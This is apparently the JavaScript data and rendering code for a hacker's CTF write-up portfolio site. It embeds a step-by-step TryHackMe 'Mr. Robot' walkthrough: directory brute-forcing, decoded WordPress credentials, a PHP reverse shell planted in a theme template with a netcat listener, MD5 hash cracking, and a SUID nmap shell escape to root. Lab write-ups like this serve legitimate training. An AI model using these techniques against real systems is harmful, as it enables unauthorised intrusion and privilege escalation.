/* =========================================================
   EDIT THIS LIST to add / remove your own writeups.
   platform: "thm" (TryHackMe) or "vh" (VulnHub)
   difficulty: "easy" | "medium" | "hard" | "insane"
   url: link to your full writeup (markdown page, blog post, etc.)
   ========================================================= */
const WRITEUPS = [
  {
    slug: "blue",
    title: "Blue",
    platform: "thm",
    difficulty: "easy",
    date: "2026-01-12",
    desc: "EternalBlue (MS17-010) against an unpatched Windows 7 box, from SMB enum to SYSTEM.",
    tags: ["smb", "eternalblue", "metasploit"],
    url: "#"
  },
  {
    slug: "kenobi",
    title: "Kenobi",
    platform: "thm",
    difficulty: "easy",
    date: "2026-01-20",
    desc: "Samba enumeration, an anonymous FTP share, and a PATH hijack for root.",
    tags: ["samba", "ftp", "path-hijack"],
    url: "#"
  },
  {
    slug: "mr-robot",
    title: "Mr. Robot",
    platform: "thm",
    difficulty: "medium",
    date: "2026-05-19",
    creator: "Leon Johnson",
    room: "https://tryhackme.com/room/mrrobot",
    desc: "WordPress theme-editor reverse shell, an MD5 hash crack, and a SUID nmap privesc to root.",
    tags: ["wordpress", "john", "suid", "nmap"],
    url: "#",
    content: [
      { type: "h2", icon: "&#128075;", text: "Introduction" },
      { type: "p", text: "Hello everyone! Sh4d0wSpl01t here. Today we’re going to dive deep into <strong>Mr. Robot</strong>, a medium-level machine on TryHackMe inspired by the hit TV series. This room covers web enumeration, WordPress exploitation, password cracking, and privilege escalation via SUID binaries." },
      { type: "list", items: [
        "Hidden directories and information disclosure via /robots.txt",
        "WordPress credential brute-forcing with a custom dictionary",
        "Reverse shell delivery through theme injection",
        "SUID binary abuse for root privilege escalation"
      ]},
      { type: "p", text: "Let’s hack our way into the system — just like our favorite hacker, Elliot Alderson." },

      { type: "h2", icon: "&#128269;", text: "Phase 1: Reconnaissance" },
      { type: "p", text: "As with any pentest, we start with enumeration. Our weapon of choice: nmap." },
      { type: "code", lang: "bash", code: "nmap -sC -sV -oN nmap-initial.txt 10.10.x.x" },
      { type: "image", src: "static/assets/mr-robot/nmap-scan.png", alt: "nmap scan", caption: "nmap scan on the target IP" },
      { type: "p", text: "Scan Results:" },
      { type: "image", src: "static/assets/mr-robot/nmap-scan-results.png", alt: "nmap scan results", caption: "nmap scan results against the target IP" },

      { type: "h2", icon: "&#128193;", text: "Phase 2: Web Enumeration \u2014 the robots.txt discovery" },
      { type: "p", text: "The landing page looks stylish, but the real treasure is in hidden directories. Time to brute-force them." },
      { type: "code", lang: "bash", code: "ffuf -u http://10.10.x.x/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" },
      { type: "image", src: "static/assets/mr-robot/ffuf-results.png", alt: "ffuf scan results", caption: "ffuf directory brute-force results" },
      { type: "p", text: "The <code>robots</code> path stands out. Navigating to <code>/robots</code> turns up two immediate findings: a flag file and a wordlist." },

      { type: "h2", icon: "&#128273;", text: "First Flag \u2014 Key 1 of 3" },
      { type: "code", lang: "bash", code: "curl http://10.10.x.x/key-1-of-3.txt" },
      { type: "image", src: "static/assets/mr-robot/flag1-curl.png", alt: "curl output for flag 1", caption: "Extracting key-1-of-3.txt with curl" },

      { type: "h2", icon: "&#128218;", text: "The Dictionary File" },
      { type: "p", text: "We also grab the wordlist <code>fsocity.dic</code> — it comes in handy later for cracking a password hash." },
      { type: "code", lang: "bash", code: "curl -O http://10.10.x.x/fsocity.dic\nsort fsocity.dic | uniq > fsocity-clean.dic" },
      { type: "p", text: "Digging through the <code>license</code> directory turns up a base64 blob buried further down the page." },
      { type: "code", lang: "bash", code: "echo '<base64 string>' | base64 -d" },
      { type: "image", src: "static/assets/mr-robot/base64-decode.png", alt: "decoding the base64 string", caption: "Decoding the embedded base64 string reveals WordPress credentials" },

      { type: "h2", icon: "&#128274;", text: "Phase 3: WordPress Discovery & Brute Force" },
      { type: "p", text: "The presence of <code>/wp-login</code> confirms a WordPress install. We already have a decoded credential to try." },
      { type: "image", src: "static/assets/mr-robot/wp-login.png", alt: "WordPress login page", caption: "The WordPress login page at /wp-login" },

      { type: "h2", icon: "&#128137;", text: "Phase 4: Gaining Foothold \u2014 WordPress to Reverse Shell" },
      { type: "p", text: "Logging in with <code>elliot</code> / <code>ER28-0652</code> gets us into the WordPress admin panel." },
      { type: "list", items: [
        "Navigate to Appearance &rarr; Theme Editor",
        "Select the 404.php template — often overlooked, perfect for a payload",
        "Replace the contents with a PHP reverse shell and click Update File"
      ]},
      { type: "code", lang: "bash", code: "# on the attacking machine\nnc -lvnp 1234" },
      { type: "code", lang: "bash", code: "# trigger the shell by requesting a page that 404s\ncurl http://10.10.x.x/?404.php" },
      { type: "image", src: "static/assets/mr-robot/reverse-shell.png", alt: "reverse shell caught on netcat listener", caption: "Shell caught as the daemon user" },
      { type: "p", text: "Stabilize the shell once it lands:" },
      { type: "code", lang: "bash", code: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nexport SHELL=/bin/bash\n# Ctrl+Z, then:\nstty raw -echo; fg" },

      { type: "h2", icon: "&#128100;", text: "Phase 5: Privilege Escalation \u2014 From Daemon to Robot" },
      { type: "code", lang: "bash", code: "ls -la /home\ncd /home/robot\ncat password.raw-md5" },
      { type: "p", text: "That's an MD5 hash — crack it with John the Ripper against rockyou:" },
      { type: "code", lang: "bash", code: "echo \"c3fcd3d76192e4007dfb496cca67e13b\" > hash.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
      { type: "image", src: "static/assets/mr-robot/john-crack.png", alt: "John the Ripper cracking the hash", caption: "John cracks the robot user's MD5 hash" },
      { type: "code", lang: "bash", code: "su robot\ncat /home/robot/key-2-of-3.txt" },

      { type: "h2", icon: "&#128081;", text: "Phase 6: Privilege Escalation \u2014 From Robot to Root" },
      { type: "p", text: "Time to hunt for SUID binaries — files that execute with the owner's privileges." },
      { type: "code", lang: "bash", code: "find / -type f -perm -04000 2>/dev/null" },
      { type: "image", src: "static/assets/mr-robot/suid-find.png", alt: "SUID binaries found on the system", caption: "nmap turns up as an unexpected SUID binary" },
      { type: "p", text: "nmap's interactive mode allows shelling out — and since it runs as root, that gives us a root shell." },
      { type: "code", lang: "bash", code: "nmap --interactive\n!sh" },
      { type: "code", lang: "bash", code: "cd /root\nls\ncat key-3-of-3.txt" },
      { type: "p", text: "All three keys captured — box rooted." },
      { type: "video", src: "static/assets/mr-robot/root-privesc.mp4", caption: "Full nmap SUID privesc to root, captured live" }
    ]
  },
  {
    slug: "wonderland",
    title: "Wonderland",
    platform: "thm",
    difficulty: "medium",
    date: "2026-02-15",
    desc: "A rabbit-hole heavy box: hidden directories, python library hijacking, and a setuid binary escape.",
    tags: ["ssti", "python", "setuid"],
    url: "#"
  },
  {
    slug: "dc-9",
    title: "DC-9",
    platform: "vh",
    difficulty: "medium",
    date: "2026-03-01",
    desc: "SQL injection into admin creds, port knocking to reach SSH, and a weak-credential privesc chain.",
    tags: ["sqli", "port-knocking", "ssh"],
    url: "#"
  },
  {
    slug: "wreath-network",
    title: "Wreath Network",
    platform: "thm",
    difficulty: "hard",
    date: "2026-03-22",
    desc: "A three-box pivot chain using SSH tunnelling and Sliver C2 to move through an internal network.",
    tags: ["pivoting", "c2", "ssh-tunnel"],
    url: "#"
  },
  {
    slug: "sar",
    title: "Sar",
    platform: "vh",
    difficulty: "easy",
    date: "2026-04-05",
    desc: "robots.txt leads to a vulnerable CMS endpoint, then a scheduled-job privesc to root.",
    tags: ["cms", "cron", "enumeration"],
    url: "#"
  },
  {
    slug: "wonderland2",
    title: "Wonderland2",
    platform: "vh",
    difficulty: "insane",
    date: "2026-04-18",
    desc: "Multi-stage chain combining a custom binary reverse engineer, a chained LFI, and kernel privesc.",
    tags: ["reversing", "lfi", "kernel-exploit"],
    url: "#"
  }
];

document.getElementById("year").textContent = new Date().getFullYear();

/* ---------- live EAT clock ---------- */
const clockEl = document.getElementById("clock-time");
const eatFormatter = new Intl.DateTimeFormat("en-US", {
  timeZone: "Africa/Nairobi",
  hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true
});
function updateClock(){
  clockEl.textContent = eatFormatter.format(new Date());
}
updateClock();
setInterval(updateClock, 1000);

/* ---------- header prompt: typing "cat root-flag.txt" on a loop ---------- */
const tcTypedEl = document.getElementById("tc-typed");
const TC_COMMAND = "cat root-flag.txt";
let tcIndex = 0, tcDeleting = false;

function tcTypeLoop(){
  if (!tcDeleting){
    tcIndex++;
    tcTypedEl.textContent = TC_COMMAND.slice(0, tcIndex);
    if (tcIndex === TC_COMMAND.length){
      tcDeleting = true;
      setTimeout(tcTypeLoop, 1600);
      return;
    }
  } else {
    tcIndex--;
    tcTypedEl.textContent = TC_COMMAND.slice(0, tcIndex);
    if (tcIndex === 0){
      tcDeleting = false;
      setTimeout(tcTypeLoop, 400);
      return;
    }
  }
  setTimeout(tcTypeLoop, tcDeleting ? 35 : 70);
}
tcTypeLoop();

/* ---------- render cards ---------- */
const grid = document.getElementById("card-grid");
const emptyState = document.getElementById("empty-state");
const platformLabel = { thm: "TryHackMe", vh: "VulnHub" };

function renderCards(list){
  grid.innerHTML = "";
  list.forEach(w => {
    const card = document.createElement("a");
    card.href = w.content ? `#w/${w.slug}` : w.url;
    card.className = "card";
    card.innerHTML = `
      <div class="card-top">
        <span class="platform-tag"><span class="platform-dot ${w.platform}"></span>${platformLabel[w.platform]}</span>
        <span class="difficulty ${w.difficulty}">${w.difficulty}</span>
      </div>
      <div class="card-body">
        <h3 class="card-title">${w.title}</h3>
        <p class="card-desc">${w.desc}</p>
        <div class="tags">${w.tags.map(t => `<span class="tag">#${t}</span>`).join("")}</div>
        <div class="card-meta" style="margin-top:12px;"><span>${w.date}</span></div>
        <div class="card-cta">cat writeup.md <span class="arrow">&rarr;</span></div>
      </div>`;
    grid.appendChild(card);
  });
  emptyState.classList.toggle("show", list.length === 0);
}

function updateStats(){
  document.getElementById("stat-total").textContent = WRITEUPS.length;
  document.getElementById("stat-thm").textContent = WRITEUPS.filter(w => w.platform === "thm").length;
  document.getElementById("stat-vh").textContent = WRITEUPS.filter(w => w.platform === "vh").length;
}

let activeFilter = "all";
function applyFilters(){
  const q = document.getElementById("search-input").value.trim().toLowerCase();
  const filtered = WRITEUPS.filter(w => {
    const matchesPlatform = activeFilter === "all" || w.platform === activeFilter;
    const haystack = (w.title + " " + w.tags.join(" ") + " " + w.desc).toLowerCase();
    const matchesQuery = q === "" || haystack.includes(q);
    return matchesPlatform && matchesQuery;
  });
  renderCards(filtered);
}

document.querySelectorAll(".chip").forEach(chip => {
  chip.addEventListener("click", () => {
    document.querySelectorAll(".chip").forEach(c => c.classList.remove("active"));
    chip.classList.add("active");
    activeFilter = chip.dataset.filter;
    applyFilters();
  });
});
document.getElementById("search-input").addEventListener("input", applyFilters);

updateStats();
renderCards(WRITEUPS);

/* ---------- writeup reader ---------- */
const reader = document.getElementById("reader");
const readerArticle = document.getElementById("reader-article");
const readerEyebrow = document.getElementById("reader-eyebrow");
const readerTitle = document.getElementById("reader-title");
const readerMeta = document.getElementById("reader-meta");
const readerTags = document.getElementById("reader-tags");
const tocList = document.getElementById("toc-list");
const tocDetails = document.getElementById("toc-details");

let sectionObserver = null;

function escapeHtml(str){
  return String(str).replace(/[&<>"']/g, ch => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
  }[ch]));
}

function slugify(str){
  return String(str).toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "");
}

function renderBlock(block, i){
  switch(block.type){
    case "h2":
      return `<h2 class="rc-h2" id="${block.id}">${block.icon ? `<span class="h2-icon">${block.icon}</span>` : ""}${block.text}</h2>`;
    case "p":
      return `<p class="rc-p">${block.text}</p>`;
    case "list":
      return `<ul class="rc-list">${block.items.map(it => `<li>${it}</li>`).join("")}</ul>`;
    case "code":
      return `
        <div class="rc-code">
          <div class="rc-code-head">
            <span>${block.lang || "shell"}</span>
            <button class="rc-copy" data-code-index="${i}">copy</button>
          </div>
          <pre><code id="rc-code-${i}">${escapeHtml(block.code)}</code></pre>
        </div>`;
    case "image":
      return `
        <figure class="rc-media" id="rc-media-${i}">
          <div class="rc-media-frame">
            <img src="${block.src}" alt="${escapeHtml(block.alt || "")}" onerror="document.getElementById('rc-media-${i}').classList.add('missing')">
            <div class="rc-media-fallback">
              <strong>Image not found</strong>
              <small>expected at: ${escapeHtml(block.src)}</small>
            </div>
          </div>
          ${block.caption ? `<figcaption class="rc-caption">${escapeHtml(block.caption)}</figcaption>` : ""}
        </figure>`;
    case "video":
      return `
        <figure class="rc-media" id="rc-media-${i}">
          <div class="rc-media-frame">
            <video controls onerror="document.getElementById('rc-media-${i}').classList.add('missing')">
              <source src="${block.src}">
            </video>
            <div class="rc-media-fallback">
              <strong>Video not found</strong>
              <small>expected at: ${escapeHtml(block.src)}</small>
            </div>
          </div>
          ${block.caption ? `<figcaption class="rc-caption">${escapeHtml(block.caption)}</figcaption>` : ""}
        </figure>`;
    default:
      return "";
  }
}

function openReader(slug){
  const w = WRITEUPS.find(x => x.slug === slug);
  if (!w || !w.content) return;

  // assign a stable id (+ keep any icon) to every heading, used by both the
  // article and the sidebar so clicking a TOC entry scrolls to the right spot
  let headingCount = 0;
  w.content.forEach(block => {
    if (block.type === "h2"){
      block.id = `sec-${slugify(block.text)}-${headingCount++}`;
    }
  });

  readerEyebrow.innerHTML = `
    <span class="platform-tag"><span class="platform-dot ${w.platform}"></span>${platformLabel[w.platform]}</span>
    <span class="difficulty ${w.difficulty}">${w.difficulty}</span>`;
  readerTitle.textContent = w.title;
  readerMeta.innerHTML = `
    <span>${w.date}</span>
    ${w.creator ? `<span>by ${escapeHtml(w.creator)}</span>` : ""}
    ${w.room ? `<a href="${w.room}" target="_blank" rel="noopener">room link &rarr;</a>` : ""}`;
  readerTags.innerHTML = w.tags.map(t => `<span class="tag">#${t}</span>`).join("");
  readerArticle.innerHTML = w.content.map(renderBlock).join("");

  const headings = w.content.filter(b => b.type === "h2");
  tocList.innerHTML = headings.map(h =>
    `<a href="#${h.id}" data-target="${h.id}"><span class="toc-icon">${h.icon || "&bull;"}</span>${h.text}</a>`
  ).join("");
  tocDetails.open = window.innerWidth > 900;

  readerArticle.querySelectorAll(".rc-copy").forEach(btn => {
    btn.addEventListener("click", () => {
      const idx = btn.dataset.codeIndex;
      const codeEl = document.getElementById(`rc-code-${idx}`);
      navigator.clipboard.writeText(codeEl.textContent).then(() => {
        btn.textContent = "copied";
        btn.classList.add("copied");
        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 1500);
      });
    });
  });

  tocList.querySelectorAll("a").forEach(link => {
    link.addEventListener("click", e => {
      e.preventDefault();
      document.getElementById(link.dataset.target)?.scrollIntoView({ behavior: "smooth" });
      if (window.innerWidth <= 900) tocDetails.open = false;
    });
  });

  if (sectionObserver) sectionObserver.disconnect();
  const tocLinks = tocList.querySelectorAll("a");
  sectionObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      const link = tocList.querySelector(`a[data-target="${entry.target.id}"]`);
      if (!link) return;
      if (entry.isIntersecting) {
        tocLinks.forEach(l => l.classList.remove("active"));
        link.classList.add("active");
      }
    });
  }, { rootMargin: "-90px 0px -70% 0px", threshold: 0 });
  readerArticle.querySelectorAll(".rc-h2").forEach(h => sectionObserver.observe(h));

  document.body.classList.add("reading");
  reader.classList.add("open");
  window.scrollTo(0, 0);
}

function closeReader(){
  document.body.classList.remove("reading");
  reader.classList.remove("open");
  if (location.hash.startsWith("#w/")){
    history.pushState("", document.title, window.location.pathname + window.location.search);
  }
}

function handleHash(){
  const hash = location.hash;
  if (hash.startsWith("#w/")){
    openReader(hash.slice(3));
  } else {
    document.body.classList.remove("reading");
    reader.classList.remove("open");
  }
}

document.getElementById("reader-back").addEventListener("click", closeReader);
document.addEventListener("keydown", e => {
  if (e.key === "Escape" && reader.classList.contains("open")) closeReader();
});
window.addEventListener("hashchange", handleHash);
handleHash();

/* ---------- hero terminal typing ---------- */
const lines = [
  "cat motd.txt",
  "ls -la ./writeups/",
  "grep -r 'root' --include=*.md | wc -l"
];
const typedEl = document.getElementById("typed-line");
let li = 0, ci = 0, deleting = false;

function typeLoop(){
  const current = lines[li];
  if (!deleting){
    ci++;
    typedEl.textContent = current.slice(0, ci);
    if (ci === current.length){
      deleting = true;
      setTimeout(typeLoop, 1400);
      return;
    }
  } else {
    ci--;
    typedEl.textContent = current.slice(0, ci);
    if (ci === 0){
      deleting = false;
      li = (li + 1) % lines.length;
    }
  }
  setTimeout(typeLoop, deleting ? 35 : 55);
}
typeLoop();

/* ---------- matrix rain background ---------- */
const canvas = document.getElementById("matrix-canvas");
const ctx = canvas.getContext("2d");
let cols, drops, nameCols;
const glyphs = "01アイウエオカキクケコサシスセソ$#@%&";
const SIGNATURE = "Sh4d0wSpl01t".split("");

function sizeCanvas(){
  canvas.width = canvas.offsetWidth;
  canvas.height = canvas.offsetHeight;
  cols = Math.floor(canvas.width / 16);
  drops = new Array(cols).fill(0);
  // pick a scattered subset of columns to spell out the signature as they fall
  nameCols = new Map();
  for (let i = 0; i < cols; i++){
    if (Math.random() < 0.11){
      nameCols.set(i, Math.floor(Math.random() * SIGNATURE.length));
    }
  }
}
sizeCanvas();
window.addEventListener("resize", sizeCanvas);

const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

function drawMatrix(){
  ctx.fillStyle = "rgba(6,10,8,0.10)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.font = "14px monospace";
  for (let i = 0; i < drops.length; i++){
    let text;
    if (nameCols.has(i)){
      const idx = nameCols.get(i);
      text = SIGNATURE[idx % SIGNATURE.length];
      nameCols.set(i, idx + 1);
      ctx.fillStyle = "#eafff2";
      ctx.shadowColor = "#00ff6a";
      ctx.shadowBlur = 6;
    } else {
      text = glyphs[Math.floor(Math.random() * glyphs.length)];
      ctx.fillStyle = "#00ff6a";
      ctx.shadowBlur = 0;
    }
    ctx.fillText(text, i * 16, drops[i] * 16);
    ctx.shadowBlur = 0;
    if (drops[i] * 16 > canvas.height && Math.random() > 0.975){
      drops[i] = 0;
      if (nameCols.has(i) && Math.random() < 0.5){
        nameCols.set(i, Math.floor(Math.random() * SIGNATURE.length));
      } else if (Math.random() < 0.11){
        nameCols.set(i, 0);
      } else {
        nameCols.delete(i);
      }
    }
    drops[i]++;
  }
}
if (!reduceMotion){
  setInterval(drawMatrix, 60);
} else {
  ctx.fillStyle = "rgba(0,255,106,0.04)";
  ctx.fillRect(0,0,canvas.width,canvas.height);
}
